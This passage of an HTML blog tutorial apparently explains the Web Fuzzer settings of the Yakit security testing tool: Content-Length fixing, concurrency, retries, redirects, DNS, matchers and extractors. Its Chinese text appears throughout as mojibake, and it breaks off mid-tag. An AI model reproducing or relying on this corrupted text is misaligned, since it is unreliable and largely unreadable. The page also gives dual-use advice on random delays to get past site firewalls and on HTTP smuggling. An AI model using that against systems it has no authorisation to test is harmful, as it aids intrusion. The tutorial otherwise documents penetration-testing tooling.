class="headerlink" title="12.4.3 ä¸ä¿®å¤é•¿åº¦"></a>12.4.3 ä¸ä¿®å¤é•¿åº¦</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWeb Fuzzerä¼šå¯¹è¯·æ±‚åŒ…è¿›è¡Œä¸€äº›ä¿®å¤ï¼Œå…¶ä¸­ä¹Ÿä¼šå¯¹<code>Content-Length</code>è¯·æ±‚å¤´è¿›è¡Œä¿®å¤ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨æ•°æ®åŒ…å®Œå…¨æ­£ç¡®çš„æƒ…å†µä¸‹ï¼Œ<code>Content-Length</code>è¯·æ±‚å¤´çš„å€¼åº”è¯¥ç­‰äºè¯·æ±‚ä½“çš„é•¿åº¦ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¿®æ”¹äº†è¯·æ±‚ä½“ä¹‹åä¸å¯èƒ½æ‰‹åŠ¨å»è®¡ç®—<code>Content-Length</code>çš„å€¼ï¼Œè¿™æ—¶å€™Web Fuzzerå°±ä¼šè‡ªåŠ¨ä¿®å¤<code>Content-Length</code>çš„å€¼ã€‚ä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½é‡åˆ°HTTPèµ°ç§çš„æƒ…å†µæˆ–è€…ä¸å¸Œæœ›Web Fuzzerä¿®å¤é•¿åº¦ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¼€å¯<strong>ä¸ä¿®å¤é•¿åº¦</strong>é€‰é¡¹ã€‚     </p><h3 id="12-4-4-è¶…æ—¶æ—¶é•¿"><a href="#12-4-4-è¶…æ—¶æ—¶é•¿" class="headerlink" title="12.4.4 è¶…æ—¶æ—¶é•¿"></a>12.4.4 è¶…æ—¶æ—¶é•¿</h3><p>å³æ¯ä¸ªè¯·æ±‚çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚åœ¨è¯·æ±‚è¶…æ—¶æ—¶ï¼ŒWeb Fuzzerä¼šè‡ªåŠ¨è¿”å›å¹¶æç¤ºè¯·æ±‚è¶…æ—¶çš„é”™è¯¯ã€‚</p><h3 id="12-4-5-æ‰¹é‡ç›®æ ‡"><a href="#12-4-5-æ‰¹é‡ç›®æ ‡" class="headerlink" title="12.4.5 æ‰¹é‡ç›®æ ‡"></a>12.4.5 æ‰¹é‡ç›®æ ‡</h3><p>æ‰¹é‡ç›®æ ‡åœ¨ä½ è¦å¯¹å¤šä¸ªç›®æ ‡è¿›è¡Œæµ‹è¯•æ—¶éå¸¸æœ‰ç”¨ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰‹åŠ¨è¾“å…¥æˆ–è€…ä¸Šä¼ æ–‡ä»¶çš„æ–¹å¼æ¥æŒ‡å®šå¤šä¸ªç›®æ ‡ï¼Œè¿™äº›ç›®æ ‡ä¹‹é—´ç”¨è‹±æ–‡é€—å·æˆ–æ¢è¡Œç¬¦åˆ†éš”ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.20.12.png" style="zoom:50%;"><h2 id="12-5-å¹¶å‘é…ç½®"><a href="#12-5-å¹¶å‘é…ç½®" class="headerlink" title="12.5 å¹¶å‘é…ç½®"></a>12.5 å¹¶å‘é…ç½®</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.21.48.png" style="zoom:50%;"><h3 id="12-5-1-é‡å¤å‘åŒ…"><a href="#12-5-1-é‡å¤å‘åŒ…" class="headerlink" title="12.5.1 é‡å¤å‘åŒ…"></a>12.5.1 é‡å¤å‘åŒ…</h3><p>é‡å¤å‘åŒ…ä¸€èˆ¬ç”¨äºæµ‹è¯•æ¡ä»¶ç«äº‰æˆ–è€…å¤§å¹¶å‘çš„æƒ…å†µã€‚å¡«å†™<strong>é‡å¤å‘åŒ…</strong>çš„å€¼ï¼ˆåç»­ç§°ä¹‹ä¸ºnï¼‰åï¼ŒWeb Fuzzerä¼šé‡å¤å‘åŒ…næ¬¡ã€‚è¿™å®é™…ä¸Šä¹Ÿæ˜¯é€šè¿‡æ·»åŠ äº†fuzztagæ ‡ç­¾å®ç°çš„ï¼Œå…¶ç­‰ä»·äºåœ¨è¯·æ±‚åŒ…çš„ä»»æ„ä½ç½®æ·»åŠ <code>{{repeat(n)}}</code>ã€‚</p><h3 id="12-5-2-å¹¶å‘çº¿ç¨‹"><a href="#12-5-2-å¹¶å‘çº¿ç¨‹" class="headerlink" title="12.5.2 å¹¶å‘çº¿ç¨‹"></a>12.5.2 å¹¶å‘çº¿ç¨‹</h3><p>åœ¨æˆ‘ä»¬è®¾ç½®äº†fuzztagåï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå‘é€ä¸æ­¢ä¸€ä¸ªæ•°æ®åŒ…ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡å¡«å†™<strong>å¹¶å‘çº¿ç¨‹</strong>çš„å€¼æ§åˆ¶ç”¨äºå¹¶å‘çš„çº¿ç¨‹æ•°é‡ã€‚è¿™åœ¨æˆ‘ä»¬éœ€è¦è¿›è¡Œå¿«é€Ÿå¹¶å‘æµ‹è¯•æˆ–è€…è¯·æ±‚ç½‘ç«™çš„é˜²ç«å¢™å¯¹è®¿é—®é€Ÿåº¦æœ‰é™åˆ¶æ—¶éå¸¸æœ‰ç”¨ã€‚</p><h3 id="12-5-3-éšæœºå»¶è¿Ÿ"><a href="#12-5-3-éšæœºå»¶è¿Ÿ" class="headerlink" title="12.5.3 éšæœºå»¶è¿Ÿ"></a>12.5.3 éšæœºå»¶è¿Ÿ</h3><p>åœ¨æˆ‘ä»¬å¹¶å‘è¯·æ±‚ç½‘ç«™çš„åœºæ™¯ä¸‹ï¼Œè¯·æ±‚ç½‘ç«™çš„é˜²ç«å¢™å¯èƒ½ä¼šå¯¹è®¿é—®é€Ÿåº¦æœ‰é™åˆ¶ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®<strong>éšæœºå»¶è¿Ÿ</strong>çš„Minå’ŒMaxå€¼ï¼Œè¿™æ ·å¯ä»¥åœ¨æ¯æ¬¡è¯·æ±‚ä¹‹å‰å»¶è¿Ÿéšæœºçš„æ—¶é—´ï¼ˆMin-Maxç§’ï¼‰ï¼Œè¿™å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šé€šè¿‡è¯·æ±‚ç½‘ç«™çš„é˜²ç«å¢™ã€‚</p><h2 id="12-6-é‡è¯•é…ç½®"><a href="#12-6-é‡è¯•é…ç½®" class="headerlink" title="12.6 é‡è¯•é…ç½®"></a>12.6 é‡è¯•é…ç½®</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.31.07.png" style="zoom:50%;"><h3 id="12-6-1-é‡è¯•æ¬¡æ•°"><a href="#12-6-1-é‡è¯•æ¬¡æ•°" class="headerlink" title="12.6.1 é‡è¯•æ¬¡æ•°"></a>12.6.1 é‡è¯•æ¬¡æ•°</h3><p>åœ¨ç½‘ç»œè¯·æ±‚ä¸­ï¼Œæˆ‘ä»¬ä¸å¯é¿å…ä¼šé‡åˆ°è®¸å¤šç½‘ç»œè¿é€šæ€§çš„é—®é¢˜ï¼Œæ¯”å¦‚æœåŠ¡å™¨è´Ÿè½½è¿‡é«˜å¯¼è‡´æœåŠ¡ç«¯é”™è¯¯ï¼ˆ502çŠ¶æ€ç ï¼‰æˆ–è€…ç½‘ç»œæ³¢åŠ¨å¯¼è‡´è¯·æ±‚å¤±è´¥ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®<strong>é‡è¯•æ¬¡æ•°</strong>çš„å€¼æ¥æ§åˆ¶Web Fuzzeré‡è¯•çš„æ¬¡æ•°ï¼Œè¿™å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæé«˜è¯·æ±‚çš„ç¨³å®šæ€§ã€‚</p><h3 id="12-6-2-é‡è¯•æ¡ä»¶"><a href="#12-6-2-é‡è¯•æ¡ä»¶" class="headerlink" title="12.6.2 é‡è¯•æ¡ä»¶"></a>12.6.2 é‡è¯•æ¡ä»¶</h3><p><strong>é‡è¯•æ¡ä»¶</strong>é…åˆé‡è¯•æ¬¡æ•°ä½¿ç”¨ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¡«å†™<strong>é‡è¯•æ¡ä»¶</strong>ä¸­çŠ¶æ€ç çš„å€¼ï¼Œè®¾ç½®å…¶åœ¨å“åº”ä»€ä¹ˆçŠ¶æ€ç æ—¶è¿›è¡Œé‡è¯•ã€‚ä¾‹å¦‚æˆ‘ä»¬å¡«å†™äº†<code>502,503</code>ï¼Œåˆ™å½“å“åº”çŠ¶æ€ç ä¸º502æˆ–è€…503æ—¶ï¼ŒWeb Fuzzerä¼šè¿›è¡Œé‡è¯•ã€‚</p><h3 id="12-6-3-ä¸é‡è¯•æ¡ä»¶"><a href="#12-6-3-ä¸é‡è¯•æ¡ä»¶" class="headerlink" title="12.6.3 ä¸é‡è¯•æ¡ä»¶"></a>12.6.3 ä¸é‡è¯•æ¡ä»¶</h3><p><strong>ä¸é‡è¯•æ¡ä»¶</strong>é…åˆé‡è¯•æ¬¡æ•°ä½¿ç”¨ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¡«å†™<strong>ä¸é‡è¯•æ¡ä»¶</strong>ä¸­çŠ¶æ€ç çš„å€¼ï¼Œè®¾ç½®å…¶åœ¨å“åº”ä»€ä¹ˆçŠ¶æ€ç æ—¶ä¸è¿›è¡Œé‡è¯•ã€‚ä¾‹å¦‚æˆ‘ä»¬å¡«å†™äº†<code>200,302</code>ï¼Œåˆ™å½“å“åº”çŠ¶æ€ç ä¸º200æˆ–è€…302æ—¶ï¼ŒWeb Fuzzerä¸ä¼šè¿›è¡Œé‡è¯•ã€‚</p><p>æ— è®ºå¦‚ä½•ï¼ŒWeb Fuzzerä¸ä¼šå¯¹30xçš„å“åº”çŠ¶æ€ç è¿›è¡Œé‡è¯•ã€‚</p><h2 id="12-7-é‡å®šå‘é…ç½®"><a href="#12-7-é‡å®šå‘é…ç½®" class="headerlink" title="12.7 é‡å®šå‘é…ç½®"></a>12.7 é‡å®šå‘é…ç½®</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.35.47.png" style="zoom:50%;"><h3 id="12-7-1-ç¦ç”¨é‡å®šå‘"><a href="#12-7-1-ç¦ç”¨é‡å®šå‘" class="headerlink" title="12.7.1 ç¦ç”¨é‡å®šå‘"></a>12.7.1 ç¦ç”¨é‡å®šå‘</h3><p>å¼€å¯<strong>ç¦ç”¨é‡å®šå‘</strong>é€‰é¡¹å¯ä»¥ç¦ç”¨è¯·æ±‚æ—¶çš„è‡ªåŠ¨é‡å®šå‘ã€‚è¿™åœ¨æˆ‘ä»¬éœ€è¦æµ‹è¯•é‡å®šå‘æ¼æ´æ—¶éå¸¸æœ‰ç”¨ã€‚</p><h3 id="12-7-2-é‡å®šå‘æ¬¡æ•°"><a href="#12-7-2-é‡å®šå‘æ¬¡æ•°" class="headerlink" title="12.7.2 é‡å®šå‘æ¬¡æ•°"></a>12.7.2 é‡å®šå‘æ¬¡æ•°</h3><p><strong>é‡å®šå‘æ¬¡æ•°</strong>çš„å€¼åªæœ‰åœ¨å…³é—­<strong>ç¦ç”¨é‡å®šå‘</strong>é€‰é¡¹æ—¶ç”Ÿæ•ˆã€‚å®ƒè¡¨ç¤ºçš„æ˜¯åœ¨è¯·æ±‚æ—¶æœ€å¤šå…è®¸é‡å®šå‘å¤šå°‘æ¬¡ã€‚</p><h3 id="12-7-3-JSé‡å®šå‘"><a href="#12-7-3-JSé‡å®šå‘" class="headerlink" title="12.7.3 JSé‡å®šå‘"></a>12.7.3 JSé‡å®šå‘</h3><p>æˆ‘ä»¬çŸ¥é“jsä¸€èˆ¬é€šè¿‡è°ƒç”¨<code>window.location.href</code>æˆ–è€…<code>window.location.replace</code>æ¥è¿›è¡Œé¡µé¢çš„é‡å®šå‘ã€‚ä¸€èˆ¬æƒ…å†µä¸‹è¿™ç§é‡å®šå‘æ˜¯æ— æ³•è·Ÿè¸ªçš„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¼€å¯<strong>JSé‡å®šå‘</strong>é€‰é¡¹ï¼Œæ¥è·Ÿè¸ªè¿™ç§é‡å®šå‘ã€‚</p><h2 id="12-8-DNSé…ç½®"><a href="#12-8-DNSé…ç½®" class="headerlink" title="12.8 DNSé…ç½®"></a>12.8 DNSé…ç½®</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.39.30.png" style="zoom:50%;"><h3 id="12-8-1-DNSæœåŠ¡å™¨é…ç½®"><a href="#12-8-1-DNSæœåŠ¡å™¨é…ç½®" class="headerlink" title="12.8.1 DNSæœåŠ¡å™¨é…ç½®"></a>12.8.1 DNSæœåŠ¡å™¨é…ç½®</h3><p><strong>DNSæœåŠ¡å™¨</strong>ç”¨äºæŒ‡å®šæœ¬æ¬¡è¯·æ±‚ä½¿ç”¨çš„DNSæœåŠ¡å™¨ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒWeb Fuzzerä¼šä½¿ç”¨ç³»ç»Ÿçš„DNSæœåŠ¡å™¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®šDNSæœåŠ¡å™¨ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¡«å†™<strong>DNSæœåŠ¡å™¨</strong>çš„å€¼ï¼Œè¿™åœ¨è®¿é—®ä¸€äº›å†…ç½‘æœåŠ¡æ—¶éå¸¸æœ‰ç”¨ã€‚</p><h3 id="12-8-2-Hostsé…ç½®"><a href="#12-8-2-Hostsé…ç½®" class="headerlink" title="12.8.2 Hostsé…ç½®"></a>12.8.2 Hostsé…ç½®</h3><p><strong>Hostsé…ç½®</strong>å¯ä»¥ç›´æ¥æ·»åŠ hoståˆ°ipçš„æ˜ å°„ã€‚è¿™åœ¨æŒ‡å®šçš„dnsæœåŠ¡å™¨éƒ½æ— æ³•æ­£å¸¸å·¥ä½œçš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ã€‚</p><h2 id="12-9-WebFuzzeråºåˆ—"><a href="#12-9-WebFuzzeråºåˆ—" class="headerlink" title="12.9 WebFuzzeråºåˆ—"></a>12.9 WebFuzzeråºåˆ—</h2><h3 id="12-9-1-ç›¸å…³é«˜çº§é…ç½®"><a href="#12-9-1-ç›¸å…³é«˜çº§é…ç½®" class="headerlink" title="12.9.1 ç›¸å…³é«˜çº§é…ç½®"></a>12.9.1 ç›¸å…³é«˜çº§é…ç½®</h3><h4 id="1ï¼‰åŒ¹é…å™¨"><a href="#1ï¼‰åŒ¹é…å™¨" class="headerlink" title="1ï¼‰åŒ¹é…å™¨"></a>1ï¼‰åŒ¹é…å™¨</h4><ul><li>åŸºæœ¬äº†è§£</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.35.15.png" style="zoom:50%;"><p>ä¸€å…±æœ‰ä¸‰ç§åŒ¹é…æ¨¡å¼ï¼š<strong>ä¸¢å¼ƒï¼Œä¿ç•™ï¼Œä»…åŒ¹é…</strong>ã€‚è¿™ä¸‰ä¸ªæ¨¡å¼å¾ˆå¥½ç†è§£ï¼š</p><ol><li>ä¸¢å¼ƒï¼šä¸¢å¼ƒæ¨¡å¼ä¼šåœ¨ç¬¦åˆåŒ¹é…å™¨æ—¶ä¸‹ä¸¢å¼ƒè¿”å›åŒ…ã€‚</li><li>ä¿ç•™ï¼šä¿ç•™æ¨¡å¼ä¼šåœ¨ç¬¦åˆåŒ¹é…å™¨æ—¶ä¿ç•™è¿”å›åŒ…ï¼Œå‰©ä½™çš„è¿”å›åŒ…åˆ™ç›´æ¥ä¸¢å¼ƒã€‚</li><li>ä»…åŒ¹é…ï¼šä»…åŒ¹é…æ¨¡å¼ä¼šåœ¨ç¬¦åˆåŒ¹é…å™¨æ—¶å°†å¯¹åº”çš„è¿”å›åŒ…æŸ“è‰²ï¼Œè€Œä¸åšå…¶ä»–æ“ä½œã€‚</li></ol><p>åœ¨åŒ¹é…æ¨¡å¼çš„æ—è¾¹ï¼Œæœ‰ä¸€ä¸ª<strong>çº¢è‰²çš„åœˆ</strong>ï¼Œè¿™é‡Œå®é™…ä¸Šæ˜¯é¢œè‰²æŒ‰é’®ï¼Œç”¨äºè®¾ç½®åœ¨ä»…åŒ¹é…æ¨¡å¼ä¸‹çš„æŸ“è‰²é¢œè‰²ã€‚</p><p>å†å¾€å³çœ‹ï¼Œæœ‰ä¸¤ä¸ªäºŒé€‰ä¸€æŒ‰é’®ï¼š<strong>ANDå’ŒOR</strong>ã€‚è¿™ä¸¤ä¸ªæŒ‰é’®ç”¨äºè®¾ç½®å¤šä¸ªæ•°æ®æå–å™¨çš„åŒ¹é…é€»è¾‘ï¼ŒANDè¡¨ç¤ºæ‰€æœ‰åŒ¹é…å™¨çš„æ¡ä»¶éƒ½éœ€è¦åŒ¹é…ï¼ŒORè¡¨ç¤ºåªéœ€è¦æœ‰å…¶ä¸­ä¸€ä¸ªæ¡ä»¶åŒ¹é…å³å¯ã€‚</p><ul><li>æ·»åŠ æ–¹æ³•</li></ul><p>æˆ‘ä»¬ç‚¹å‡»ä¸‹æ–¹çš„æ·»åŠ æŒ‰é’®æˆ–è€…ä¸Šå›¾ä¸­å³ä¸Šè§’çš„æ·»åŠ /è°ƒè¯•æŒ‰é’®ï¼Œå°±å¯ä»¥æ·»åŠ åŒ¹é…å™¨äº†ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.41.23.png" style="zoom:50%;"><ul><li>ä½¿ç”¨æ–¹æ³•</li></ul><p>åŒ¹é…å™¨ç»™æˆ‘ä»¬æä¾›äº†å¤šç§åŒ¹é…ç±»å‹ä¸åŒ¹é…ä½ç½®ï¼Œæ–¹ä¾¿æˆ‘ä»¬ç¼–å†™å¤æ‚çš„åŒ¹é…å™¨ã€‚</p><p>åŒ¹é…ç±»å‹ï¼š</p><ol><li>å…³é”®å­—ï¼šå…³é”®å­—å°±æ˜¯åœ¨åŒ¹é…ä½ç½®ä¸­åŒ¹é…è¾“å…¥çš„å…³é”®å­—ã€‚</li><li>æ­£åˆ™è¡¨è¾¾å¼ï¼šæ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯åœ¨åŒ¹é…ä½ç½®ä¸­åŒ¹é…è¾“å…¥çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</li><li>çŠ¶æ€ç ï¼šï¼ˆ<strong>å¿½ç•¥åŒ¹é…ä½ç½®</strong>ï¼‰çŠ¶æ€ç å°±æ˜¯åŒ¹é…å“åº”çš„çŠ¶æ€ç ï¼Œæˆ‘ä»¬åªéœ€è¦å¡«å†™å¸Œæœ›åŒ¹é…åˆ°çš„çŠ¶æ€ç å³å¯ã€‚</li><li>åå…­è¿›åˆ¶ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¸Œæœ›åŒ¹é…çš„å­—ç¬¦ä¸²ä¸æ˜¯æ­£å¸¸å¯è§çš„asciiç ï¼Œè¿™æ—¶å€™ä½ å°±å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶è¿™ç§åŒ¹é…ç±»å‹ï¼Œè¾“å…¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚å­—ç¬¦ä¸²â€302â€å¯¹åº”åå…­è¿›åˆ¶å­—ç¬¦ä¸²â€333032â€ï¼‰ã€‚</li><li>è¡¨è¾¾å¼ï¼šï¼ˆ<strong>å¿½ç•¥åŒ¹é…ä½ç½®</strong>ï¼‰è¡¨è¾¾å¼å¯ä»¥æ›´åŠ çµæ´»åœ°ç¼–å†™æˆ‘ä»¬æ‰€å¸Œæœ›çš„åŒ¹é…è§„åˆ™ï¼Œå®ƒè¿˜èƒ½ä¸åç»­è¦è®²çš„ é«˜çº§é…ç½®ï¼šå˜é‡ è”åŠ¨ã€‚è¡¨è¾¾å¼çš„è¯­æ³•ä¸nuclei-dslè¯­æ³•å…¼å®¹ï¼Œç†Ÿæ‚‰nucleiå·¥å…·çš„å¸ˆå‚…å¯ä»¥å°è¯•åœ¨è¡¨è¾¾å¼ä¸­ç¼–å†™ä¸€äº›å¤æ‚çš„åŒ¹é…è§„åˆ™ã€‚ä¸€ä¸ªåŒ¹é…å“åº”ä½“ä¸­æ˜¯å¦å­˜åœ¨å¯¹åº”å­—ç¬¦ä¸²çš„ä¾‹å­å¦‚ä¸‹ï¼š<code>contains(body,'302 Found')</code>ã€‚</li></ol><p>åŒ¹é…ä½ç½®ï¼šï¼ˆä»¥ä¸‹é¢è¿™ä¸ªå“åº”åŒ…ä¸ºä¾‹ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">HTTP/1.1 <span class="token number">302</span> FoundConnection: keep-aliveContent-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8Location: https://www.baidu.com/Content-Length: <span class="token number">154</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token number">302</span> Found<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>çŠ¶æ€ç ï¼šåŒ¹é…èŒƒå›´ä»…æœ‰çŠ¶æ€ç ã€‚</li><li>å“åº”å¤´ï¼šåŒ¹é…èŒƒå›´åŒ…å«å“åº”çš„ç¬¬ä¸€è¡Œï¼ˆåœ¨ä¾‹å­æ˜¯<code>HTTP/1.1 302 Found</code>ï¼‰ä»¥åŠå“åº”å¤´ã€‚</li><li>å“åº”ä½“ï¼šåŒ¹é…èŒƒå›´åŒ…å«å“åº”æ­£æ–‡ï¼ˆåœ¨ä¾‹å­é‡Œæ˜¯<code>&lt;html&gt;&lt;body&gt;302 Found&lt;/body&gt;&lt;/html&gt;</code>ï¼‰ã€‚</li><li>å…¨éƒ¨å“åº”ï¼šåŒ¹é…èŒƒå›´å³æ•´ä¸ªå“åº”åŒ…ã€‚</li></ol><p>å¦å¤–åŒ¹é…å™¨è¿˜åŒ…å«**ä¸åŒ¹é…(å–å)**è¿™ä¸ªé€‰é¡¹ï¼Œå…¶æ„æ€æ˜¯å°†åŒ¹é…æ”¹ä¸ºä¸åŒ¹é…ï¼Œè¿™æ–¹ä¾¿æˆ‘ä»¬ç¼–å†™æ›´å¤æ‚çš„åŒ¹é…å™¨ã€‚</p><h4 id="2ï¼‰æ•°æ®æå–å™¨"><a href="#2ï¼‰æ•°æ®æå–å™¨" class="headerlink" title="2ï¼‰æ•°æ®æå–å™¨"></a>2ï¼‰æ•°æ®æå–å™¨</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.48.35.png" style="zoom:50%;"><p>æ•°æ®æå–å™¨çš„åŠŸèƒ½æ˜¯å°†å“åº”åŒ…ä¸­çš„æŸäº›æ•°æ®æå–å‡ºæ¥ã€‚</p><ul><li>æ·»åŠ æ•°æ®æå–å™¨</li></ul><p>ç‚¹å‡»æ·»åŠ æŒ‰é’®å³å¯</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.50.03.png" style="zoom:50%;"><p>æ•°æ®æå–å™¨åŒæ ·ç»™æˆ‘ä»¬æä¾›äº†å¤šç§æå–ç±»å‹ä¸æå–ä½ç½®ï¼Œæ–¹ä¾¿æˆ‘ä»¬ç¼–å†™å¤æ‚çš„æ•°æ®æå–å™¨ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æ•°æ®æå–å™¨çš„å·¦ä¸Šè§’ï¼ˆdata_0ï¼‰æ—è¾¹å­˜åœ¨ä¸€ä¸ªç¼–å†™æŒ‰é’®ï¼Œè¿™æ˜¯ç”¨äºä¿®æ”¹æå–å™¨çš„åå­—ï¼Œè¿™ä¸ªåå­—å¯ä»¥åœ¨åç»­å˜é‡å’ŒWeb Fuzzeråºåˆ—ä¸­ä½¿ç”¨ã€‚</p><ul><li>æå–ç±»å‹</li></ul><ol><li>æ­£åˆ™è¡¨è¾¾å¼ï¼šæ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯åœ¨æå–ä½ç½®ä¸­æå–è¾“å…¥çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„å†…å®¹ã€‚æˆ‘ä»¬çŸ¥é“åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­å¯ä»¥ä½¿ç”¨å°æ‹¬å·æ¥åˆ†ç»„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨<strong>åŒ¹é…æ­£åˆ™åˆ†ç»„</strong>ä¸­é€‰æ‹©åˆ†ç»„ï¼Œè¿™æ ·å°±å¯ä»¥æå–åˆ°æƒ³è¦çš„å†…å®¹äº†ã€‚(åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­,0åˆ†ç»„å³ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„æ‰€æœ‰å†…å®¹)</li><li>XPathï¼šï¼ˆæå–èŒƒå›´åªèƒ½æ˜¯<strong>å“åº”ä½“</strong>ï¼‰XPathå°±æ˜¯åœ¨æå–ä½ç½®ä¸­æå–è¾“å…¥çš„XPathåŒ¹é…åˆ°çš„å†…å®¹ã€‚XPathæ˜¯ä¸€ç§ç”¨äºåœ¨XMLæ–‡æ¡£ä¸­é€‰æ‹©èŠ‚ç‚¹çš„è¯­è¨€ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆè½»æ˜“åœ°ä½¿ç”¨æµè§ˆå™¨å¼€å‘å·¥å…·æ¥å¤åˆ¶å®Œæ•´çš„Xpathã€‚</li><li>é”®å€¼å¯¹ï¼šé”®å€¼å¯¹çš„æå–è§„åˆ™ç¨å¾®æœ‰ç‚¹å¤æ‚ã€‚é”®å€¼å¯¹ä¼šå°è¯•æå–æ‰€æœ‰å¯èƒ½å­˜åœ¨çš„jsonçš„keyå¯¹åº”çš„valueï¼Œä»¥åŠæ‰€æœ‰å½¢ä¼¼<code>key=value</code>ä¸­valueçš„å€¼ã€‚å¦‚æœæå–ä½ç½®åŒ…å«å“åº”å¤´ï¼ˆæå–èŒƒå›´ä¸º<strong>å“åº”å¤´</strong>æˆ–<strong>Raw</strong>ï¼‰ï¼Œåˆ™ä»–è¿˜ä¼šå°è¯•æå–å“åº”å¤´ä¸­çš„valueå€¼ã€‚å¦å¤–è¿˜æœ‰ä¸¤ä¸ªç‰¹æ®Šçš„é”®å€¼å¯¹ï¼Œåˆ†åˆ«ä¸º<code>proto</code>ï¼Œ<code>status_code</code>ï¼Œåˆ†åˆ«å¯¹åº”å“åº”çš„HTTPåè®®ç‰ˆæœ¬å’Œå“åº”çŠ¶æ€ç ã€‚</li><li>JQ(*)ï¼šï¼ˆæå–èŒƒå›´åªèƒ½æ˜¯<strong>å“åº”ä½“</strong>ï¼‰jqæ˜¯ä¸€ç§ç”¨äºåœ¨JSONæ–‡æ¡£ä¸­é€‰æ‹©èŠ‚ç‚¹çš„å·¥å…·ï¼Œå…¶å¯¹åº”çš„æ–‡æ¡£æ•™ç¨‹<a href="https://jqlang.github.io/jq/manual/">åœ¨æ­¤</a>ã€‚</li><li>è¡¨è¾¾å¼ï¼šï¼ˆ<strong>å¿½ç•¥åŒ¹é…ä½ç½®</strong>ï¼‰è¡¨è¾¾å¼ä¸ä¸Šé¢åŒ¹é…å™¨ä¸­çš„è¡¨è¾¾å¼ç›¸åŒï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</li></ol><p>å¯¹äº<strong>Xpath</strong>è¿™ç§æå–ç±»å‹ï¼Œæˆ‘ä»¬ä»¥ä¸‹é¢çš„ä¾‹å­åšè®²è§£ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.57.37.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.57.52.png" 